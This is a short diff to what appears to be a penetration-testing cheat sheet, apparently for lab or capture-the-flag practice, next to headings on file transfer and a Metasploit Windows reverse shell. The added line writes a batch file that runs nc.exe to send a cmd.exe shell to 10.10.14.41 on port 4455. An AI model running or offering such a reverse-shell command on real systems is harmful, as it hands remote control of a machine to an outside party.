@@ -26,7 +26,7 @@ wget
 
 scp
 
-
+echo c:\Users\kohsuke\Desktop\nc.exe 10.10.14.41 4455 -e cmd.exe > reverse.bat
 ```
 
 # Metasploit Windows Reverse Shell
